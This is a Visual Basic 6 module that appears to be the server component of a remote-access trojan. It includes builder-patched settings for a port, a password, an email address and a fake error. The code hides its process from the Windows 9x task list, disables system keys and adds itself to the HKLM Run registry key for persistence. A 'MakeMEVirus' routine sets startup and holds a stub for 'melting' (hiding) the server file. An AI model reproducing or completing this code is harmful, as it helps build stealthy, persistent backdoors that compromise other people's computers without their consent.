Attribute VB_Name = "Kernel"
'Constants
Private Const RSP_SIMPLE_SERVICE = 1
Private Const RSP_UNREGISTER_SERVICE = 0
Private Const VER_PLATFORM_WIN32_NT = 2
Private Const VER_PLATFORM_WIN32_9X = 1
'Modifyable Stuff By The Sever Editor
Public Const InitialPort = "|4000©|"
Public Const PwString = "|©©©©©©©©©©|"
Public Const EmailAddress = "|©©©©©©©©©©©©©©©©©©©©©©©©©©©©©©|"
Public Const KillOption = "|killisno|"
Public Const RegService = "|srviceisno|"
Public Const StartUpMethod = "|startupno|"
Public Const FakeError = "|fakeno|"

'Declerations
Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
Public Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function GetVersionExA Lib "kernel32" (lpVersionInformation As OSVERSIONINFO) As Long
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function InternetGetConnectedState Lib "wininet" (lpdwFlags As Long, ByVal dwReserved As Long) As Boolean
Private Declare Function SetTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long, ByVal uElapse As Long, ByVal lpTimerFunc As Long) As Long
Private Declare Function KillTimer Lib "user32" (ByVal hwnd As Long, ByVal nIDEvent As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal length As Long)
Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, lpvParam As Any, ByVal fuWinIni As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegDeleteValue Lib "advapi32.dll" Alias "RegDeleteValueA" (ByVal hKey As Long, ByVal lpValueName As String) As Long
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long

'System Constants
Private Const SPI_SCREENSAVERRUNNING = 97&

'Internet Constants
Private Const INTERNET_CONNECTION_MODEM = 1
Private Const INTERNET_CONNECTION_LAN = 2
Private Const INTERNET_CONNECTION_PROXY = 4
Private Const INTERNET_CONNECTION_MODEM_BUSY = 8

'Types & Structures
Private Type OSVERSIONINFO
    dwOSVersionInfoSize As Long
    dwMajorVersion As Long
    dwMinorVersion As Long
    dwBuildNumber As Long
    dwPlatformId As Long
    szCSDVersion As String * 128
End Type

'Enums
Public Enum Enum_OperatingPlatform
  Platform_Windows_32 = 0
  Platform_Windows_95_98_ME = 1
  Platform_Windows_NT_2K_XP = 2
End Enum
Public Enum Enum_OperatingSystem
  System_Windows_32 = 0
  System_Windows_95 = 1
  System_Windows_98 = 2
  System_Windows_ME = 3
  System_Windows_NT = 4
  System_Windows_2K = 5
  System_Windows_XP = 6
End Enum

'Variables
Public IsServerActivated As Boolean  'Activated if password sended is true from the server
Public SrvHwnd As Long 'The Handler Of The Server Main Form to be genralized over all the project
Public AppExeName As String 'The ExeFileName of the server (ME!)
Public OSPlatForm As Enum_OperatingPlatform '0 for others OS's,1 for Win98/Me , 2 for WinNT&XP
Public OSName As Enum_OperatingSystem 'Operatting System NAME
Public Win_dir As String, Sys_dir As String
Private TimerID As Integer
Public Function Delay(S As Double)
    Dim I As Currency
    For I = 0 To (S * 10000)
        DoEvents
    Next
End Function
Public Sub MakeMeService()
    Dim ProcessID As Long
    ProcessID = GetCurrentProcessId()
    retVal = RegisterServiceProcess(ProcessID, RSP_SIMPLE_SERVICE)
End Sub
Public Sub UnMakeMeService()
    Dim PID As Long, reserv As Long
    'Get the current process ID
    PID = GetCurrentProcessId()
    'Unregister as service
    regserv = RegisterServiceProcess(PID, RSP_UNREGISTER_SERVICE)
End Sub
Public Function GET_RANDOM(VLow, VHigh) As Integer   'I IS MINIMUM VALUE AND J IS THE MAX VALUE
     Randomize
     GET_RANDOM = Int((VHigh - VLow + 1) * Rnd + VLow)
End Function
Public Function String_Size(NuSize As Currency) As String
'154278 Byte > 150.6 kb
Dim Tmp1 As Double
If NuSize < 1024 Then 'Byte
    String_Size = NuSize & " B"
ElseIf NuSize > 1024 And NuSize <= 1024 ^ 2 Then 'Kilo Byte
    Tmp1 = NuSize / 1024
    String_Size = Round(Tmp1, 2) & " KB"
ElseIf NuSize > 1024 ^ 2 And NuSize <= 1024 ^ 3 Then 'Mega Byte
    Tmp1 = NuSize / 1024 ^ 2
    String_Size = Round(Tmp1, 2) & " MB"
Else
    Tmp1 = NuSize / 1024 ^ 3
    String_Size = Round(Tmp1, 2) & " GB"
End If
End Function
Public Function Char_Representation(Value As Long) As String
   'This Function Accept long number and convert it to 32 bit lenght string
    Dim Char(3) As Byte
    On Error Resume Next
    For I = 0 To 3
        Char(I) = Int(Value / (255 ^ I)) Mod 255
    Next
    For I = 0 To 3: Char_Representation = Char_Representation & Chr$(Char(I)): Next
End Function
Public Function Long_Representation(Str As String) As Long
   'This Function Accept 32 bit lenght String and convert it to long number
    Dim Char(3) As Byte
    For I = 0 To 3: Char(I) = Asc(Mid$(Str, I + 1, 1)): Next
    For I = 0 To 3
        Long_Representation = Long_Representation + (Char(I) * (255 ^ I))
    Next
End Function
Public Function AddBackslash(S As String) As String
    If Len(S) Then
       If Right$(S, 1) <> "\" Then
          AddBackslash = S & "\"
       Else
          AddBackslash = S
       End If
    Else
       AddBackslash = "\"
    End If
End Function
Public Function GetWinInfo()
'Function Retrive all windows system information in "OSPlateForm" & "OSName"
    On Error Resume Next
    Dim IRet As Long
   'Plate From Information
    Dim lpVersionInformation As OSVERSIONINFO
    lpVersionInformation.dwOSVersionInfoSize = Len(lpVersionInformation)
    Call GetVersionExA(lpVersionInformation)
    OSPlatForm = lpVersionInformation.dwPlatformId
   'Version Name
    If (lpVersionInformation.dwPlatformId = Platform_Windows_32) Then
        OSName = System_Windows_32
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_95_98_ME) And (lpVersionInformation.dwMinorVersion = 0) Then
        OSName = System_Windows_95
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_95_98_ME) And (lpVersionInformation.dwMinorVersion = 10) Then
        OSName = System_Windows_98
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_95_98_ME) And (lpVersionInformation.dwMinorVersion = 90) Then
        OSName = System_Windows_ME
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_NT_2K_XP) And (lpVersionInformation.dwMajorVersion < 5) Then
        OSName = System_Windows_NT
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_NT_2K_XP) And (lpVersionInformation.dwMajorVersion = 5) And (lpVersionInformation.dwMinorVersion = 0) Then
        OSName = System_Windows_2K
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_NT_2K_XP) And (lpVersionInformation.dwMajorVersion = 5) And (lpVersionInformation.dwMinorVersion = 1) Then
        OSName = System_Windows_XP
    End If
   'Windows Directory
    Win_dir = Space(255)
    IRet = GetWindowsDirectory(Win_dir, 255)
    Win_dir = AddBackslash(Left$(Win_dir, IRet))
   'System Directory
    Sys_dir = Space(255)
    IRet = GetSystemDirectory(Sys_dir, 255)
    Sys_dir = AddBackslash(Left$(Sys_dir, IRet))
End Function
Public Function ReadOptions(Str As String) As String
     On Error Resume Next
    'This Function Resposable for Discardding The x Elemnts In The Modifyable Values
     Dim RetStr As String, StrLen As Integer
     StrLen = Len(Str)
    'Cut The Stop and end bytes
     RetStr = Mid$(Str, 2, StrLen - 2)
    'Strip The x's
     RetStr = Mid$(RetStr, 1, InStr(1, RetStr, "©") - 1)
     ReadOptions = RetStr
End Function
Public Function StripNulls(f As String) As String 'Function clip the null char's string from the give string
    StripNulls = Left$(f, InStr(1, f, Chr$(0)) - 1)
End Function
Public Function GetInternetState() As String
    Dim Flags As Long
    Dim Result As Boolean
    Result = InternetGetConnectedState(Flags, 0)
    If Result Then
        GetInternetState = "Connected"
    Else
        GetInternetState = "Not Connected"
    End If
    If Flags And INTERNET_CONNECTION_MODEM Then GetInternetState = GetInternetState & " From Via Modem"
    If Flags And INTERNET_CONNECTION_LAN Then GetInternetState = GetInternetState & " Form Via LAN"
    If Flags And INTERNET_CONNECTION_PROXY Then GetInternetState = GetInternetState & " From uses a Proxy"
    If Flags And INTERNET_CONNECTION_MODEM_BUSY Then GetInternetState = GetInternetState & " From Via Modem but modem is busy"
End Function
Public Function Timer_start(CalBckfun As Long, Interval As Long) As Long
  TimerID = TimerID + 1
  Call SetTimer(SrvHwnd, TimerID, Interval, CalBckfun)
  Timer_start = TimerID
End Function
Public Sub Timer_stop(m_TIMER_ID As Long)
  Call KillTimer(SrvHwnd, m_TIMER_ID)
End Sub
Public Function AddText(TextObject As TextBox, SrcText As String, Optional Method = 0)
   'Method = 0 means Clear B4 Paste
   'Method = 1 means Append TextBox
    On Error Resume Next
    If Method = 0 Then TextObject = ""
   'Paste The Text
    If Len(TextObject) = 0 Then
        TextObject = SrcText
    Else
        TextObject = TextObject & vbCrLf & SrcText
    End If
    TextObject.SelStart = Len(TextObject)
End Function
Public Sub DisableKeys(dKeys As Boolean) 'To Disable System Keys From 9X plateforms
Dim lReturn As Long
Dim bPre As Boolean
lReturn = SystemParametersInfo(SPI_SCREENSAVERRUNNING, dKeys, bPre, 0&)
End Sub
Public Sub SetStartUp(Flag As Boolean)
Dim strValue As String
Dim Ret
    strValue = AppExeName
    RegCreateKey &H80000002, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\", Ret
    If Flag Then
        RegSetValueEx Ret, AppExeName, 0, 1, ByVal strValue, Len(strValue)
        IsAutoStartup = True
    Else
        RegDeleteValue Ret, AppExeName
        IsAutoStartup = False
    End If
    RegCloseKey Ret
End Sub
Public Sub MakeMEVirus(Task As String)
    Select Case Task
           Case "Melt" 'Copy the server file and hide it
                 'This option check weather the server file installed on this system b4 or
                 '
           Case "StartUp"
                SetStartUp True
           
    End Select
End Sub
